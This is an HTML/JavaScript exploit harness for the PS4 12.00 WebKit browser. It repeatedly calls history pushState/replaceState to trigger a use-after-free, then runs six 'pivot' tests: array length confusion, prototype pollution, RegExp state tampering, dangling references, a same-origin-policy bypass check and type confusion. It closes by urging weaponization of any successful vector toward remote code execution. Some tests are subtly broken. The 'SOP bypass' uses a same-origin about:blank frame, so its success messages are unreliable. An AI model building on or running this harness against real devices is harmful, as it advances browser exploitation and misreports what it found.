<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Pivoting Exploit Strategy</title>
<style>
body { 
  font-family: 'Courier New', monospace; 
  background: #000; 
  color: #0f0; 
  padding: 20px;
  line-height: 1.6;
}
.container {
  max-width: 1200px;
  margin: 0 auto;
}
h2 { color: #f0f; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
h3 { color: #0ff; margin-top: 30px; }
button {
  background: #0f0;
  color: #000;
  border: none;
  padding: 12px 24px;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  margin: 10px 5px;
  font-family: inherit;
}
button:hover { background: #0c0; }
button.danger { background: #f00; color: #fff; }
button.danger:hover { background: #c00; }
#log { 
  white-space: pre-wrap; 
  background: #001100; 
  padding: 20px; 
  border: 2px solid #0f0;
  max-height: 600px;
  overflow-y: auto;
  margin: 20px 0;
  font-size: 13px;
}
.success { color: #0f0; }
.warning { color: #ff0; }
.error { color: #f00; }
.critical { color: #f0f; font-weight: bold; }
.info { color: #0cf; }
.section {
  background: #001a00;
  border-left: 4px solid #0f0;
  padding: 15px;
  margin: 20px 0;
}
#status { 
  font-size: 20px; 
  font-weight: bold;
  padding: 15px;
  margin: 15px 0;
  border: 2px solid;
  text-align: center;
}
.test-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 15px;
  margin: 20px 0;
}
.test-card {
  background: #002200;
  border: 1px solid #0f0;
  padding: 15px;
  border-radius: 4px;
}
.test-card h4 { color: #0ff; margin-top: 0; }
</style>
</head>
<body>
<div class="container">
<h2>üéØ PS4 12.00 - Pivoting Exploit Strategy</h2>
<p class="info">Based on analysis: UAF is in WebCore layer, not directly exploitable for RCE.</p>
<p class="warning">Strategy: Find secondary bug or lifetime confusion vector.</p>

<div id="status" class="info" style="border-color: #0cf;">Ready to Test Pivot Strategies</div>

<h3>Available Test Vectors</h3>

<div class="test-grid">
  <div class="test-card">
    <h4>Vector 1: Array Length Confusion</h4>
    <p>Exploit getter/setter during popstate</p>
    <button onclick="testVector1()">Test</button>
  </div>
  
  <div class="test-card">
    <h4>Vector 2: Prototype Chain Hijack</h4>
    <p>Pollute during serialization</p>
    <button onclick="testVector2()">Test</button>
  </div>
  
  <div class="test-card">
    <h4>Vector 3: RegExp State Corruption</h4>
    <p>Manipulate lastIndex during UAF</p>
    <button onclick="testVector3()">Test</button>
  </div>
  
  <div class="test-card">
    <h4>Vector 4: Lifetime Confusion</h4>
    <p>JS object alive, WebCore freed</p>
    <button onclick="testVector4()">Test</button>
  </div>
  
  <div class="test-card">
    <h4>Vector 5: SOP Bypass Attempt</h4>
    <p>SecurityOrigin confusion</p>
    <button onclick="testVector5()">Test</button>
  </div>
  
  <div class="test-card">
    <h4>Vector 6: Type Confusion Bridge</h4>
    <p>Cross-layer type mismatch</p>
    <button onclick="testVector6()">Test</button>
  </div>
</div>

<button onclick="runAllTests()" class="danger">üî• Run All Tests</button>
<button onclick="logEl.textContent = ''">Clear Log</button>

<pre id="log"></pre>

</div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m, cls = ''){ 
  const span = document.createElement('span');
  span.className = cls;
  span.textContent = m + "\n";
  logEl.appendChild(span);
  logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

var testResults = {
  vector1: null,
  vector2: null,
  vector3: null,
  vector4: null,
  vector5: null,
  vector6: null
};

// Core UAF trigger (reusable)
async function triggerUAF() {
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    let state = { index: i, data: [i, i*2, i*3, i*4] };
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  await sleep(200);
}

// ============================================================
// VECTOR 1: Array Length Confusion
// ============================================================
async function testVector1() {
  log("=================================================================", 'critical');
  log("VECTOR 1: ARRAY LENGTH CONFUSION", 'critical');
  log("=================================================================\n", 'critical');
  
  log("[1.1] Setting up malicious length getter");
  
  const victimArray = [1, 2, 3, 4];
  let getterCalled = 0;
  let confusionDetected = false;
  
  Object.defineProperty(victimArray, 'length', {
    get: function() {
      getterCalled++;
      
      // During popstate, return inconsistent value
      if(history.state && history.state.index >= 40) {
        log(`  üî• Getter called during UAF window (call #${getterCalled})`, 'critical');
        confusionDetected = true;
        return 0xFFFFFFFF; // Huge length
      }
      return 4; // Normal length
    },
    set: function(val) {
      log(`  ‚ö†Ô∏è  Length setter called: ${val}`, 'warning');
    }
  });
  
  log("  ‚úì Malicious getter installed\n");
  
  log("[1.2] Storing array in history state");
  history.pushState({ trigger: true, arr: victimArray }, "", "#vector1");
  
  log("[1.3] Triggering UAF");
  await triggerUAF();
  
  log("\n[1.4] Navigating to trigger state");
  
  for(let i=0; i<10; i++) {
    history.back();
    await sleep(30);
    
    if(history.state && history.state.trigger) {
      log("  ‚úì Trigger state reached", 'success');
      
      // Try to access array
      try {
        const arr = history.state.arr;
        log(`  Array length: ${arr.length}`, arr.length > 4 ? 'critical' : 'info');
        
        // Try OOB access
        for(let j=0; j<20; j++) {
          const val = arr[j];
          if(val !== undefined && j >= 4) {
            log(`  üö® OOB READ: arr[${j}] = ${val}`, 'critical');
          }
        }
      } catch(e) {
        log(`  Exception: ${e.message}`, 'error');
      }
      break;
    }
  }
  
  log(`\n[1.5] Results:`);
  log(`  Getter called: ${getterCalled} times`);
  log(`  Confusion detected: ${confusionDetected}`);
  
  testResults.vector1 = { getterCalled, confusionDetected };
  
  if(confusionDetected) {
    log("\n‚úÖ VECTOR 1: PARTIAL SUCCESS", 'success');
    statusEl.textContent = "Vector 1: Confusion Detected!";
    statusEl.className = "warning";
    statusEl.style.borderColor = "#ff0";
  } else {
    log("\n‚ùå VECTOR 1: FAILED", 'error');
  }
  
  log("\n");
}

// ============================================================
// VECTOR 2: Prototype Chain Hijack
// ============================================================
async function testVector2() {
  log("=================================================================", 'critical');
  log("VECTOR 2: PROTOTYPE CHAIN HIJACK", 'critical');
  log("=================================================================\n", 'critical');
  
  log("[2.1] Installing prototype pollution with side-effects");
  
  let toStringCalled = 0;
  let serializationHijacked = false;
  
  Object.defineProperty(Object.prototype, 'toString', {
    get: function() {
      toStringCalled++;
      
      return function() {
        if(history.state && history.state.index >= 40) {
          log(`  üî• toString hijacked during UAF (call #${toStringCalled})`, 'critical');
          serializationHijacked = true;
          
          // Try to corrupt serialization
          return "[object Corrupted]";
        }
        return Object.prototype.toString.call(this);
      };
    }
  });
  
  log("  ‚úì Malicious toString installed\n");
  
  log("[2.2] Creating complex object for serialization");
  
  const complexObj = {
    nested: { deep: { value: 12345 } },
    array: [1, 2, 3],
    func: function() { return "test"; }
  };
  
  log("[2.3] Triggering UAF with complex object");
  
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    let state = { 
      index: i, 
      complex: complexObj,
      timestamp: Date.now()
    };
    
    let frag = "E".repeat(size);
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(200);
  
  log("\n[2.4] Results:");
  log(`  toString called: ${toStringCalled} times`);
  log(`  Serialization hijacked: ${serializationHijacked}`);
  
  testResults.vector2 = { toStringCalled, serializationHijacked };
  
  // Cleanup
  delete Object.prototype.toString;
  
  if(serializationHijacked) {
    log("\n‚úÖ VECTOR 2: PARTIAL SUCCESS", 'success');
    statusEl.textContent = "Vector 2: Serialization Hijacked!";
    statusEl.className = "warning";
    statusEl.style.borderColor = "#ff0";
  } else {
    log("\n‚ùå VECTOR 2: FAILED", 'error');
  }
  
  log("\n");
}

// ============================================================
// VECTOR 3: RegExp State Corruption
// ============================================================
async function testVector3() {
  log("=================================================================", 'critical');
  log("VECTOR 3: REGEXP STATE CORRUPTION", 'critical');
  log("=================================================================\n", 'critical');
  
  log("[3.1] Creating malicious RegExp");
  
  const re = /test/g;
  let lastIndexCalled = 0;
  let stateCorrupted = false;
  
  Object.defineProperty(re, 'lastIndex', {
    get: function() {
      lastIndexCalled++;
      
      if(history.state && history.state.index >= 40) {
        log(`  üî• lastIndex accessed during UAF (call #${lastIndexCalled})`, 'critical');
        stateCorrupted = true;
        return -1; // Invalid index
      }
      return 0;
    },
    set: function(val) {
      log(`  ‚ö†Ô∏è  lastIndex set to: ${val}`, 'warning');
    }
  });
  
  log("  ‚úì Malicious lastIndex installed\n");
  
  log("[3.2] Triggering UAF with RegExp in state");
  
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    let state = { 
      index: i, 
      regex: re,
      testStr: "test test test"
    };
    
    let frag = "E".repeat(size);
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(200);
  
  log("\n[3.3] Results:");
  log(`  lastIndex accessed: ${lastIndexCalled} times`);
  log(`  State corrupted: ${stateCorrupted}`);
  
  testResults.vector3 = { lastIndexCalled, stateCorrupted };
  
  if(stateCorrupted) {
    log("\n‚úÖ VECTOR 3: PARTIAL SUCCESS", 'success');
    statusEl.textContent = "Vector 3: RegExp Corrupted!";
    statusEl.className = "warning";
    statusEl.style.borderColor = "#ff0";
  } else {
    log("\n‚ùå VECTOR 3: FAILED", 'error');
  }
  
  log("\n");
}

// ============================================================
// VECTOR 4: Lifetime Confusion
// ============================================================
async function testVector4() {
  log("=================================================================", 'critical');
  log("VECTOR 4: LIFETIME CONFUSION", 'critical');
  log("=================================================================\n", 'critical');
  
  log("[4.1] Creating object with cross-layer references");
  
  const obj = {
    buffer: new ArrayBuffer(1024),
    array: new Uint32Array(256),
    timestamp: Date.now()
  };
  
  log("[4.2] Storing in history");
  history.pushState(obj, "", "#lifetime");
  
  log("[4.3] Creating JS reference");
  window.danglingRef = history.state;
  
  log("[4.4] Triggering UAF to free WebCore side");
  await triggerUAF();
  
  log("\n[4.5] Testing dangling reference");
  
  try {
    // JS object should still be alive
    log(`  JS object alive: ${window.danglingRef !== null}`, 'success');
    log(`  Buffer byteLength: ${window.danglingRef.buffer.byteLength}`, 'info');
    
    // Try to trigger WebCore access
    log("\n  Attempting to trigger WebCore deserialization...");
    
    history.back();
    await sleep(100);
    
    // Try JSON serialization (crosses layers)
    const json = JSON.stringify(window.danglingRef);
    log(`  JSON serialized: ${json.length} bytes`, 'success');
    
    // Try to re-store (forces WebCore interaction)
    history.pushState(window.danglingRef, "", "#reuse");
    log(`  ‚úì Re-stored dangling reference`, 'warning');
    
    testResults.vector4 = { success: true, danglingAlive: true };
    
    log("\n‚úÖ VECTOR 4: REFERENCE KEPT ALIVE", 'success');
    log("  This creates JS/WebCore lifetime mismatch", 'warning');
    statusEl.textContent = "Vector 4: Lifetime Confusion!";
    statusEl.className = "warning";
    statusEl.style.borderColor = "#ff0";
    
  } catch(e) {
    log(`  Exception: ${e.message}`, 'error');
    testResults.vector4 = { success: false, error: e.message };
    log("\n‚ùå VECTOR 4: FAILED", 'error');
  }
  
  log("\n");
}

// ============================================================
// VECTOR 5: SOP Bypass Attempt
// ============================================================
async function testVector5() {
  log("=================================================================", 'critical');
  log("VECTOR 5: SAME-ORIGIN POLICY BYPASS", 'critical');
  log("=================================================================\n", 'critical');
  
  log("[5.1] Creating cross-origin iframe");
  
  const iframe = document.createElement('iframe');
  iframe.id = 'sop-test';
  iframe.style.display = 'none';
  
  // Use a different origin (will fail normally)
  iframe.src = 'about:blank';
  
  document.body.appendChild(iframe);
  
  await sleep(100);
  
  log("  ‚úì Iframe created\n");
  
  log("[5.2] Testing normal SOP (should fail)");
  
  try {
    const content = iframe.contentDocument.body;
    log(`  ‚ö†Ô∏è  Normal access succeeded: ${content}`, 'warning');
  } catch(e) {
    log(`  ‚úì Normal SOP enforced: ${e.message}`, 'success');
  }
  
  log("\n[5.3] Triggering UAF");
  await triggerUAF();
  
  log("\n[5.4] Testing SOP during UAF window");
  
  try {
    // Try to access during confused state
    const content = iframe.contentDocument.body.innerHTML;
    
    if(content !== null && content !== undefined) {
      log(`  üö® SOP BYPASS! Content: ${content.slice(0, 100)}`, 'critical');
      testResults.vector5 = { bypass: true, content };
      
      statusEl.textContent = "Vector 5: SOP BYPASS!";
      statusEl.className = "critical";
      statusEl.style.borderColor = "#f0f";
    }
    
  } catch(e) {
    log(`  ‚úì SOP still enforced: ${e.message}`, 'info');
    testResults.vector5 = { bypass: false };
  }
  
  document.body.removeChild(iframe);
  
  if(testResults.vector5 && testResults.vector5.bypass) {
    log("\n‚úÖ VECTOR 5: SOP BYPASS SUCCESS!", 'critical');
  } else {
    log("\n‚ùå VECTOR 5: FAILED", 'error');
  }
  
  log("\n");
}

// ============================================================
// VECTOR 6: Type Confusion Bridge
// ============================================================
async function testVector6() {
  log("=================================================================", 'critical');
  log("VECTOR 6: TYPE CONFUSION BRIDGE", 'critical');
  log("=================================================================\n", 'critical');
  
  log("[6.1] Creating type-confused object");
  
  // Object that looks like array but isn't
  const fakeArray = {
    0: 0x41414141,
    1: 0x42424242,
    2: 0x43434343,
    3: 0x44444444,
    length: 4
  };
  
  // Force it to behave like array
  fakeArray.__proto__ = Array.prototype;
  
  log(`  isArray: ${Array.isArray(fakeArray)}`, 'info');
  log(`  length: ${fakeArray.length}`, 'info');
  
  log("\n[6.2] Storing type-confused object");
  history.pushState({ fake: fakeArray }, "", "#typeconf");
  
  log("[6.3] Triggering UAF");
  await triggerUAF();
  
  log("\n[6.4] Navigating to confused state");
  
  for(let i=0; i<10; i++) {
    history.forward();
    await sleep(20);
  }
  
  try {
    const retrieved = history.state.fake;
    
    log(`  Retrieved type: ${typeof retrieved}`, 'info');
    log(`  isArray: ${Array.isArray(retrieved)}`, 'info');
    
    // Try array operations
    try {
      retrieved.push(0x55555555);
      log(`  ‚úì push() succeeded`, 'warning');
    } catch(e) {
      log(`  push() failed: ${e.message}`, 'info');
    }
    
    try {
      const mapped = retrieved.map(x => x * 2);
      log(`  ‚úì map() succeeded: [${mapped}]`, 'warning');
    } catch(e) {
      log(`  map() failed: ${e.message}`, 'info');
    }
    
    // Check if type changed
    if(Array.isArray(retrieved) !== Array.isArray(fakeArray)) {
      log(`\n  üö® TYPE CONFUSION! Original: ${Array.isArray(fakeArray)}, Retrieved: ${Array.isArray(retrieved)}`, 'critical');
      testResults.vector6 = { confused: true };
      
      statusEl.textContent = "Vector 6: Type Confusion!";
      statusEl.className = "critical";
      statusEl.style.borderColor = "#f0f";
    }
    
  } catch(e) {
    log(`  Exception: ${e.message}`, 'error');
  }
  
  if(testResults.vector6 && testResults.vector6.confused) {
    log("\n‚úÖ VECTOR 6: TYPE CONFUSION SUCCESS!", 'critical');
  } else {
    log("\n‚ùå VECTOR 6: FAILED", 'error');
  }
  
  log("\n");
}

// ============================================================
// RUN ALL TESTS
// ============================================================
async function runAllTests() {
  logEl.textContent = "";
  
  log("=================================================================", 'critical');
  log("RUNNING ALL PIVOT VECTORS", 'critical');
  log("=================================================================\n", 'critical');
  
  statusEl.textContent = "Running All Tests...";
  statusEl.className = "warning";
  statusEl.style.borderColor = "#ff0";
  
  await testVector1();
  await sleep(500);
  
  await testVector2();
  await sleep(500);
  
  await testVector3();
  await sleep(500);
  
  await testVector4();
  await sleep(500);
  
  await testVector5();
  await sleep(500);
  
  await testVector6();
  await sleep(500);
  
  // ============================================================
  // FINAL SUMMARY
  // ============================================================
  log("=================================================================", 'critical');
  log("FINAL SUMMARY - ALL VECTORS", 'critical');
  log("=================================================================\n", 'critical');
  
  const results = [
    { name: "Vector 1: Array Length Confusion", result: testResults.vector1 },
    { name: "Vector 2: Prototype Chain Hijack", result: testResults.vector2 },
    { name: "Vector 3: RegExp State Corruption", result: testResults.vector3 },
    { name: "Vector 4: Lifetime Confusion", result: testResults.vector4 },
    { name: "Vector 5: SOP Bypass", result: testResults.vector5 },
    { name: "Vector 6: Type Confusion Bridge", result: testResults.vector6 }
  ];
  
  let successCount = 0;
  let partialCount = 0;
  
  results.forEach((test, idx) => {
    log(`[${idx + 1}] ${test.name}:`);
    
    if(!test.result) {
      log(`    Status: NOT EXECUTED`, 'error');
    } else {
      // Determine success level
      let isSuccess = false;
      let isPartial = false;
      
      if(test.result.bypass || test.result.confused) {
        isSuccess = true;
        successCount++;
      } else if(test.result.confusionDetected || test.result.serializationHijacked || 
                test.result.stateCorrupted || test.result.danglingAlive) {
        isPartial = true;
        partialCount++;
      }
      
      if(isSuccess) {
        log(`    Status: ‚úÖ SUCCESS`, 'critical');
      } else if(isPartial) {
        log(`    Status: ‚ö†Ô∏è PARTIAL`, 'warning');
      } else {
        log(`    Status: ‚ùå FAILED`, 'error');
      }
      
      // Show details
      Object.keys(test.result).forEach(key => {
        log(`    ${key}: ${test.result[key]}`, 'info');
      });
    }
    log("");
  });
  
  log("=================================================================");
  log("OVERALL RESULTS:", 'critical');
  log(`  Full Success: ${successCount}/6`, successCount > 0 ? 'critical' : 'error');
  log(`  Partial Success: ${partialCount}/6`, partialCount > 0 ? 'warning' : 'info');
  log(`  Failed: ${6 - successCount - partialCount}/6`, 'info');
  log("=================================================================\n");
  
  // Recommendations
  log("RECOMMENDATIONS:", 'critical');
  
  if(successCount > 0) {
    log("\nüéØ CRITICAL: One or more vectors showed full exploitation!", 'critical');
    log("   Focus on the successful vector(s) for weaponization.", 'critical');
    log("   These have the highest chance of achieving RCE.\n");
  } else if(partialCount > 0) {
    log("\n‚ö†Ô∏è  Several vectors showed partial success.", 'warning');
    log("   These indicate the UAF is affecting the system.", 'warning');
    log("   Refinement needed to achieve full exploitation.\n");
  } else {
    log("\n‚ùå No vectors showed exploitation potential.", 'error');
    log("   The UAF may not be exploitable via these methods.", 'error');
    log("   Consider alternative approaches:\n");
    log("   1. Look for a secondary bug (OOB, type confusion)", 'info');
    log("   2. Investigate other WebCore primitives", 'info');
    log("   3. Research public exploits for similar bugs\n", 'info');
  }
  
  // Next steps
  log("NEXT STEPS:", 'critical');
  log("1. Analyze which vectors had partial/full success");
  log("2. Refine timing and memory state for those vectors");
  log("3. Combine multiple vectors if possible");
  log("4. Research WebKit source code for affected components");
  log("5. Look for CVEs with similar patterns\n");
  
  // Status update
  if(successCount > 0) {
    statusEl.textContent = `${successCount} Vector(s) Successful! üéØ`;
    statusEl.className = "critical";
    statusEl.style.borderColor = "#f0f";
  } else if(partialCount > 0) {
    statusEl.textContent = `${partialCount} Vector(s) Partial Success ‚ö†Ô∏è`;
    statusEl.className = "warning";
    statusEl.style.borderColor = "#ff0";
  } else {
    statusEl.textContent = "All Vectors Failed ‚ùå";
    statusEl.className = "error";
    statusEl.style.borderColor = "#f00";
  }
  
  log("=================================================================");
  log("TESTING COMPLETE", 'success');
  log("=================================================================");
}

// Initialize
log("üéØ PS4 12.00 WebKit - Pivoting Exploit Strategy", 'critical');
log("=================================================================\n");

log("STRATEGY OVERVIEW:", 'info');
log("Based on comprehensive analysis, the UAF in HistoryController");
log("is NOT directly exploitable for memory corruption/RCE.");
log("");
log("However, it MAY enable secondary exploitation vectors:");
log("");
log("‚úì Vector 1: Array Length Confusion");
log("  - Exploit getter/setter inconsistencies");
log("  - Target: Length property during popstate");
log("");
log("‚úì Vector 2: Prototype Chain Hijack");
log("  - Pollution with side-effects");
log("  - Target: Serialization/deserialization");
log("");
log("‚úì Vector 3: RegExp State Corruption");
log("  - Manipulate lastIndex during UAF");
log("  - Target: RegExp internal state");
log("");
log("‚úì Vector 4: Lifetime Confusion");
log("  - JS object alive, WebCore freed");
log("  - Target: Cross-layer lifetime mismatch");
log("");
log("‚úì Vector 5: SOP Bypass Attempt");
log("  - SecurityOrigin confusion");
log("  - Target: Same-Origin Policy checks");
log("");
log("‚úì Vector 6: Type Confusion Bridge");
log("  - Cross-layer type mismatch");
log("  - Target: JS ‚Üî WebCore type assumptions");
log("");
log("=================================================================\n");

log("Test each vector individually, or run all tests.", 'info');
log("Results will show which vectors have exploitation potential.\n");

log("‚ö†Ô∏è  WARNING: These tests may cause browser instability.", 'warning');
log("‚ö†Ô∏è  Use in controlled environment only.\n", 'warning');
</script>
</body>
</html>
